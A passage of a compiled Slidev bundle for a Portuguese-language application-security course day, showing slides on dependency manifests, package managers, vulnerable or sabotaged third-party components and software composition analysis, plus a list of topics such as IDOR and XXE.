`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},'"'),n("span",{style:{color:"#E0A569"}},"version"),n("span",{style:{color:"#858585"}},'"'),n("span",{style:{color:"#858585"}},":"),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#C98A7D"}},'"1.0.0"'),n("span",{style:{color:"#858585"}},",")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},'"'),n("span",{style:{color:"#E0A569"}},"name"),n("span",{style:{color:"#858585"}},'"'),n("span",{style:{color:"#858585"}},":"),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#C98A7D"}},'"api-teste"'),n("span",{style:{color:"#858585"}},",")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},'"'),n("span",{style:{color:"#E0A569"}},"private"),n("span",{style:{color:"#858585"}},'"'),n("span",{style:{color:"#858585"}},":"),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#D4976C"}},"true"),n("span",{style:{color:"#858585"}},",")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},'"'),n("span",{style:{color:"#E0A569"}},"dependencies"),n("span",{style:{color:"#858585"}},'"'),n("span",{style:{color:"#858585"}},":"),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#858585"}},"{")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"    "),n("span",{style:{color:"#858585"}},'"'),n("span",{style:{color:"#E0A569"}},"body-parser"),n("span",{style:{color:"#858585"}},'"'),n("span",{style:{color:"#858585"}},":"),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#C98A7D"}},'"^1.20.0"'),n("span",{style:{color:"#858585"}},",")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"    "),n("span",{style:{color:"#858585"}},'"'),n("span",{style:{color:"#E0A569"}},"express"),n("span",{style:{color:"#858585"}},'"'),n("span",{style:{color:"#858585"}},":"),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#C98A7D"}},'"^4.18.1"'),n("span",{style:{color:"#858585"}},",")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"    "),n("span",{style:{color:"#858585"}},'"'),n("span",{style:{color:"#E0A569"}},"nodemon"),n("span",{style:{color:"#858585"}},'"'),n("span",{style:{color:"#858585"}},":"),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#C98A7D"}},'"^2.0.20"')]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},"}")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"}")])])]),n("pre",{class:"slidev-code shiki shiki-light",style:{"background-color":"#ffffff"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"{")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},'"'),n("span",{style:{color:"#B58451"}},"version"),n("span",{style:{color:"#8E8F8B"}},'"'),n("span",{style:{color:"#8E8F8B"}},":"),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#B56959"}},'"1.0.0"'),n("span",{style:{color:"#8E8F8B"}},",")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},'"'),n("span",{style:{color:"#B58451"}},"name"),n("span",{style:{color:"#8E8F8B"}},'"'),n("span",{style:{color:"#8E8F8B"}},":"),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#B56959"}},'"api-teste"'),n("span",{style:{color:"#8E8F8B"}},",")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},'"'),n("span",{style:{color:"#B58451"}},"private"),n("span",{style:{color:"#8E8F8B"}},'"'),n("span",{style:{color:"#8E8F8B"}},":"),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#A65E2B"}},"true"),n("span",{style:{color:"#8E8F8B"}},",")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},'"'),n("span",{style:{color:"#B58451"}},"dependencies"),n("span",{style:{color:"#8E8F8B"}},'"'),n("span",{style:{color:"#8E8F8B"}},":"),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#8E8F8B"}},"{")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"    "),n("span",{style:{color:"#8E8F8B"}},'"'),n("span",{style:{color:"#B58451"}},"body-parser"),n("span",{style:{color:"#8E8F8B"}},'"'),n("span",{style:{color:"#8E8F8B"}},":"),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#B56959"}},'"^1.20.0"'),n("span",{style:{color:"#8E8F8B"}},",")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"    "),n("span",{style:{color:"#8E8F8B"}},'"'),n("span",{style:{color:"#B58451"}},"express"),n("span",{style:{color:"#8E8F8B"}},'"'),n("span",{style:{color:"#8E8F8B"}},":"),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#B56959"}},'"^4.18.1"'),n("span",{style:{color:"#8E8F8B"}},",")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"    "),n("span",{style:{color:"#8E8F8B"}},'"'),n("span",{style:{color:"#B58451"}},"nodemon"),n("span",{style:{color:"#8E8F8B"}},'"'),n("span",{style:{color:"#8E8F8B"}},":"),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#B56959"}},'"^2.0.20"')]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},"}")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"}")])])])],-1),i3=n("br",null,null,-1),a3=n("span",{style:{color:"#009900"}},"pom.xml",-1),c3=n("pre",{class:"shiki-container"},[n("pre",{class:"slidev-code shiki shiki-dark",style:{"background-color":"#121212"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"dependencies"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"dependency"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"		"),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"groupId"),n("span",{style:{color:"#858585"}},">"),n("span",{style:{color:"#DBD7CA"}},"org.springframework.boot"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"groupId"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"		"),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"artifactId"),n("span",{style:{color:"#858585"}},">"),n("span",{style:{color:"#DBD7CA"}},"spring-boot-starter-data-jpa"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"artifactId"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"	"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"dependency"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"	"),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"dependency"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"		"),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"groupId"),n("span",{style:{color:"#858585"}},">"),n("span",{style:{color:"#DBD7CA"}},"org.springframework.boot"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"groupId"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"		"),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"artifactId"),n("span",{style:{color:"#858585"}},">"),n("span",{style:{color:"#DBD7CA"}},"spring-boot-starter-validation"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"artifactId"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"	"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"dependency"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"	"),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"dependency"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"		"),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"groupId"),n("span",{style:{color:"#858585"}},">"),n("span",{style:{color:"#DBD7CA"}},"org.springframework.boot"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"groupId"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"		"),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"artifactId"),n("span",{style:{color:"#858585"}},">"),n("span",{style:{color:"#DBD7CA"}},"spring-boot-starter-web"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"artifactId"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"	"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"dependency"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"	"),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"dependency"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"		"),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"groupId"),n("span",{style:{color:"#858585"}},">"),n("span",{style:{color:"#DBD7CA"}},"org.springframework.boot"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"groupId"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"		"),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"artifactId"),n("span",{style:{color:"#858585"}},">"),n("span",{style:{color:"#DBD7CA"}},"spring-boot-starter-security"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"artifactId"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"		"),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"version"),n("span",{style:{color:"#858585"}},">"),n("span",{style:{color:"#DBD7CA"}},"2.6.3"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"version"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"	"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"dependency"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"dependencies"),n("span",{style:{color:"#858585"}},">")])])]),n("pre",{class:"slidev-code shiki shiki-light",style:{"background-color":"#ffffff"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"dependencies"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"dependency"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"		"),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"groupId"),n("span",{style:{color:"#8E8F8B"}},">"),n("span",{style:{color:"#393A34"}},"org.springframework.boot"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"groupId"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"		"),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"artifactId"),n("span",{style:{color:"#8E8F8B"}},">"),n("span",{style:{color:"#393A34"}},"spring-boot-starter-data-jpa"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"artifactId"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"	"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"dependency"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"	"),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"dependency"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"		"),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"groupId"),n("span",{style:{color:"#8E8F8B"}},">"),n("span",{style:{color:"#393A34"}},"org.springframework.boot"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"groupId"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"		"),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"artifactId"),n("span",{style:{color:"#8E8F8B"}},">"),n("span",{style:{color:"#393A34"}},"spring-boot-starter-validation"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"artifactId"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"	"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"dependency"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"	"),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"dependency"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"		"),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"groupId"),n("span",{style:{color:"#8E8F8B"}},">"),n("span",{style:{color:"#393A34"}},"org.springframework.boot"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"groupId"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"		"),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"artifactId"),n("span",{style:{color:"#8E8F8B"}},">"),n("span",{style:{color:"#393A34"}},"spring-boot-starter-web"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"artifactId"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"	"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"dependency"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"	"),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"dependency"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"		"),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"groupId"),n("span",{style:{color:"#8E8F8B"}},">"),n("span",{style:{color:"#393A34"}},"org.springframework.boot"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"groupId"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"		"),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"artifactId"),n("span",{style:{color:"#8E8F8B"}},">"),n("span",{style:{color:"#393A34"}},"spring-boot-starter-security"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"artifactId"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"		"),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"version"),n("span",{style:{color:"#8E8F8B"}},">"),n("span",{style:{color:"#393A34"}},"2.6.3"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"version"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"	"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"dependency"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"dependencies"),n("span",{style:{color:"#8E8F8B"}},">")])])])],-1),u3={__name:"35",setup(e){const t={srcSequence:"./slides/52.components.md"};return N(U),(s,o)=>{const r=gs;return _(),Y(Ce,pe(de(t)),{default:X(()=>[n3,n("div",s3,[n("div",null,[o3,r3,C(r,Qe({},{ranges:["all","5-9"]}),{default:X(()=>[l3]),_:1},16)]),n("div",null,[i3,a3,C(r,Qe({},{ranges:["all","14-18"]}),{default:X(()=>[c3]),_:1},16)])])]),_:1},16)}}},d3=n("h1",null,"Gerenciadores de pacotes",-1),p3={grid:"~ cols-3 gap-4"},f3={style:{"margin-left":"40px",transition:"500ms"}},m3=y("- Nuget (.Net)"),h3=[m3],g3={style:{"margin-left":"40px",transition:"500ms"}},y3=y("- Npm (NodeJS)"),v3=[y3],_3={style:{"margin-left":"40px",transition:"500ms"}},b3=y("- Yarn (NodeJS)"),x3=[b3],w3={style:{"margin-left":"40px",transition:"500ms"}},E3=y("- Pip (Python)"),A3=[E3],S3={style:{"margin-left":"40px",transition:"500ms"}},k3=y("- Maven (Java)"),C3=[k3],$3={style:{"text-align":"center"}},D3={style:{"text-align":"center"}},B3={style:{"text-align":"center"}},F3={style:{"text-align":"center"}},O3={style:{"text-align":"center"}},I3={__name:"36",setup(e){const t={clicks:5,srcSequence:"./slides/53.components.md"};return N(U),(s,o)=>{const r=Ne,l=He("click");return _(),Y(Ce,pe(de(t)),{default:X(()=>[d3,n("div",p3,[n("p",null,[W((_(),$("h3",f3,h3)),[[l]]),W((_(),$("h3",g3,v3)),[[l]]),W((_(),$("h3",_3,x3)),[[l]]),W((_(),$("h3",w3,A3)),[[l]]),W((_(),$("h3",S3,C3)),[[l]])]),n("div",null,[W((_(),$("div",$3,[C(r,{style:{margin:"0 auto","margin-top":"20px"},src:"nuget-logo.png",width:"150"})])),[[l,1]]),W((_(),$("div",D3,[C(r,{style:{margin:"0 auto","margin-top":"20px"},src:"npm-logo.png",width:"100"})])),[[l,2]]),W((_(),$("div",B3,[C(r,{style:{margin:"0 auto","margin-top":"20px"},src:"yarn-logo.png",width:"60"})])),[[l,3]])]),n("div",null,[W((_(),$("div",F3,[C(r,{style:{margin:"0 auto","margin-top":"20px"},src:"pip-logo.webp",width:"70"})])),[[l,4]]),W((_(),$("div",O3,[C(r,{style:{margin:"0 auto","margin-top":"20px"},src:"maven-logo.png",width:"200"})])),[[l,5]])])])]),_:1},16)}}},T3=n("h1",null,"Problemas em componentes",-1),P3={style:{"margin-left":"40px",transition:"500ms"}},M3=y("- Vulner\xE1veis"),L3=[M3],R3={style:{"margin-left":"40px",transition:"500ms"}},N3=y("- Desatualizados"),q3=[N3],j3={style:{"margin-left":"40px",transition:"500ms"}},H3=y("- Descontinuados"),z3=[H3],V3={style:{"margin-left":"40px",transition:"500ms"}},U3=y("- Sabotados"),W3=[U3],Y3=n("br",null,null,-1),K3={grid:"~ cols-3 gap-4"},X3={__name:"37",setup(e){const t={clicks:4,srcSequence:"./slides/54.components.md"};return N(U),(s,o)=>{const r=Ne,l=He("click");return _(),Y(Ce,pe(de(t)),{default:X(()=>[T3,n("p",null,[W((_(),$("h3",P3,L3)),[[l]]),W((_(),$("h3",R3,q3)),[[l]]),W((_(),$("h3",j3,z3)),[[l]]),W((_(),$("h3",V3,W3)),[[l]])]),Y3,n("div",K3,[n("div",null,[W(C(r,{style:{"border-radius":"10px",transition:"300ms"},src:"log4j.png",width:"300"},null,512),[[l,1]]),W(C(r,{style:{"border-radius":"10px",transition:"300ms","margin-top":"20px"},src:"npm-logo.png",width:"300"},null,512),[[l,2]])]),n("div",null,[W(C(r,{style:{"border-radius":"10px",transition:"300ms"},src:"sabotaged-packages-2.png",width:"315"},null,512),[[l,4]])]),n("div",null,[W(C(r,{style:{"border-radius":"10px",transition:"300ms"},src:"sabotaged-packages-1.png",width:"300"},null,512),[[l,4]])])])]),_:1},16)}}},Q3=n("h1",null,"Componentes comprometidos",-1),Z3={grid:"~ cols-2 gap-4"},G3={style:{"margin-left":"40px",transition:"500ms"}},J3=y("- Credenciais roubadas (Phishing)"),ew=[J3],tw={style:{"margin-left":"40px",transition:"500ms"}},nw=y("- Minera\xE7\xE3o"),sw=[nw],ow={style:{"margin-left":"40px",transition:"500ms"}},rw=y("- Lentid\xE3o"),lw=[rw],iw=n("br",null,null,-1),aw={__name:"38",setup(e){const t={srcSequence:"./slides/55.components.md"};return N(U),(s,o)=>{const r=Ne,l=He("click");return _(),Y(Ce,pe(de(t)),{default:X(()=>[Q3,n("div",Z3,[n("p",null,[W((_(),$("h3",G3,ew)),[[l]]),W((_(),$("h3",tw,sw)),[[l]]),W((_(),$("h3",ow,lw)),[[l]])]),n("div",null,[n("div",null,[C(r,{style:{"border-radius":"10px",transition:"300ms",height:"200px",width:"450px"},src:"npm-hijacked-1.png"})]),iw,n("div",null,[C(r,{style:{"border-radius":"10px",transition:"300ms",height:"200px",width:"450px"},src:"npm-hijacked-2.png"})])])])]),_:1},16)}}},cw=n("h1",null,"Software Composition Analysis (SCA)",-1),uw={__name:"39",setup(e){const t={layout:"center",class:"text-center",srcSequence:"./slides/56.sca.md"};return N(U),(s,o)=>(_(),Y(gn,pe(de(t)),{default:X(()=>[cw]),_:1},16))}},dw=[{path:"1",name:"page-1",component:p8,meta:{theme:"default",highlighter:"shiki",lineNumbers:!0,info:`## Slidev Starter Template
Presentation slides for developers.

Learn more at [Sli.dev](https://sli.dev)
`,drawings:{persist:!1},css:"unocss",srcSequence:"./slides/1.presentation.md",slide:{raw:null,title:"CRESCER - M\xD3DULO DE SEGURAN\xC7A",level:3,content:`<style>
  .logo-owasp {
    padding-left: 30%;
  }
  .logo-cwi {
    position: absolute;
    bottom: 0;
    right: 10px;
  }
</style>
### CRESCER - M\xD3DULO DE SEGURAN\xC7A

# DIA 2

<div class="logo-cwi">
  <Image :src="'/cwi-logo.png'" :height="'150'" :width="'150'" />
</div>`,frontmatter:{theme:"default",highlighter:"shiki",lineNumbers:!0,info:`## Slidev Starter Template
Presentation slides for developers.

Learn more at [Sli.dev](https://sli.dev)
`,drawings:{persist:!1},css:"unocss",srcSequence:"./slides/1.presentation.md"},index:0,start:0,end:17,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/1.presentation.md",raw:`<style>
  .logo-owasp {
    padding-left: 30%;
  }
  .logo-cwi {
    position: absolute;
    bottom: 0;
    right: 10px;
  }
</style>
### CRESCER - M\xD3DULO DE SEGURAN\xC7A

# DIA 2

<div class="logo-cwi">
  <Image :src="'/cwi-logo.png'" :height="'150'" :width="'150'" />
</div>`,title:"CRESCER - M\xD3DULO DE SEGURAN\xC7A",level:3,content:`<style>
  .logo-owasp {
    padding-left: 30%;
  }
  .logo-cwi {
    position: absolute;
    bottom: 0;
    right: 10px;
  }
</style>
### CRESCER - M\xD3DULO DE SEGURAN\xC7A

# DIA 2

<div class="logo-cwi">
  <Image :src="'/cwi-logo.png'" :height="'150'" :width="'150'" />
</div>`,frontmatter:{title:"CRESCER - M\xD3DULO DE SEGURAN\xC7A"},index:0,start:0,end:17},inline:{raw:`---
# try also 'default' to start simple
theme: default
# random image from a curated Unsplash collection by Anthony
# like them? see https://unsplash.com/collections/94734566/slidev
# background: https://st2.depositphotos.com/1000393/6507/i/600/depositphotos_65076917-stock-photo-hacker-and-terrorism-fight.jpg
# apply any windi css classes to the current slide
# class: 'text-center'
# https://sli.dev/custom/highlighters.html
highlighter: shiki
# show line numbers in code blocks
lineNumbers: true
# some information about the slides, markdown enabled
info: |
  ## Slidev Starter Template
  Presentation slides for developers.

  Learn more at [Sli.dev](https://sli.dev)
# persist drawings in exports and build
drawings:
  persist: false
# use UnoCSS
css: unocss
src: ./slides/1.presentation.md
---
`,content:"",frontmatter:{theme:"default",highlighter:"shiki",lineNumbers:!0,info:`## Slidev Starter Template
Presentation slides for developers.

Learn more at [Sli.dev](https://sli.dev)
`,drawings:{persist:!1},css:"unocss"},index:0,start:0,end:26},filepath:"/home/tux/Work/crescer/dia-2/slides/1.presentation.md",notesHTML:"",id:0,no:1},__clicksElements:[],__preloaded:!1}},{path:"2",name:"page-2",component:y8,meta:{title:"Abordagens",srcSequence:"./slides/2.intro.md",slide:{raw:null,title:"Abordagens",level:1,content:`# Abordagens

<br />

- Quebra de controle de acesso
- IDOR
- Criptografia
- HTTP vs HTTPS
- HASHES
- XXE - XML External Entities
- S3 - AWS
- Firebase
- Secrets`,frontmatter:{title:"Abordagens",srcSequence:"./slides/2.intro.md"},index:1,start:0,end:13,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/2.intro.md",raw:`# Abordagens

<br />

- Quebra de controle de acesso
- IDOR
- Criptografia
- HTTP vs HTTPS
- HASHES
- XXE - XML External Entities
- S3 - AWS
- Firebase
- Secrets`,title:"Abordagens",level:1,content:`# Abordagens

<br />

- Quebra de controle de acesso
- IDOR
- Criptografia
- HTTP vs HTTPS
- HASHES
- XXE - XML External Entities
- S3 - AWS
- Firebase
- Secrets`,frontmatter:{title:"Abordagens"},index:0,start:0,end:13},inline:{raw:`---
src: ./slides/2.intro.md
---
`,content:"",frontmatter:{},index:1,start:26,end:30},filepath:"/home/tux/Work/crescer/dia-2/slides/2.intro.md",notesHTML:"",id:1,no:2},__clicksElements:[],__preloaded:!1}},{path:"3",name:"page-3",component:x8,meta:{title:"Quebra de Controle de Acesso",layout:"center",class:"text-center",srcSequence:"./slides/3.broken-access-control.md",slide:{raw:null,title:"Quebra de Controle de Acesso",level:1,content:"# Quebra de Controle de Acesso",frontmatter:{title:"Quebra de Controle de Acesso",layout:"center",class:"text-center",srcSequence:"./slides/3.broken-access-control.md"},index:2,start:0,end:1,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/3.broken-access-control.md",raw:"# Quebra de Controle de Acesso",title:"Quebra de Controle de Acesso",level:1,content:"# Quebra de Controle de Acesso",frontmatter:{title:"Quebra de Controle de Acesso"},index:0,start:0,end:1},inline:{raw:`---
src: ./slides/3.broken-access-control.md
layout: center
class: text-center
---
`,content:"",frontmatter:{layout:"center",class:"text-center"},index:2,start:30,end:36},filepath:"/home/tux/Work/crescer/dia-2/slides/3.broken-access-control.md",notesHTML:"",id:2,no:3},__clicksElements:[],__preloaded:!1}},{path:"4",name:"page-4",component:A8,meta:{title:"O que \xE9 Controle de Acesso ?",srcSequence:"./slides/4.broken-access-control.md",slide:{raw:null,title:"O que \xE9 Controle de Acesso ?",level:1,content:`<style>
  .img-hor-vert {
    transform: rotateY(180deg);
  }
</style>

# O que \xE9 Controle de Acesso ?

Um controle de quem pode acessar determinado recurso.

<div>
  <Image src="/broken-access-control-firewall.png" style="margin: 0 auto;margin-top:50px;width:500px" />
</div>`,frontmatter:{title:"O que \xE9 Controle de Acesso ?",srcSequence:"./slides/4.broken-access-control.md"},index:3,start:0,end:13,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/4.broken-access-control.md",raw:`<style>
  .img-hor-vert {
    transform: rotateY(180deg);
  }
</style>

# O que \xE9 Controle de Acesso ?

Um controle de quem pode acessar determinado recurso.

<div>
  <Image src="/broken-access-control-firewall.png" style="margin: 0 auto;margin-top:50px;width:500px" />
</div>`,title:"O que \xE9 Controle de Acesso ?",level:1,content:`<style>
  .img-hor-vert {
    transform: rotateY(180deg);
  }
</style>

# O que \xE9 Controle de Acesso ?

Um controle de quem pode acessar determinado recurso.

<div>
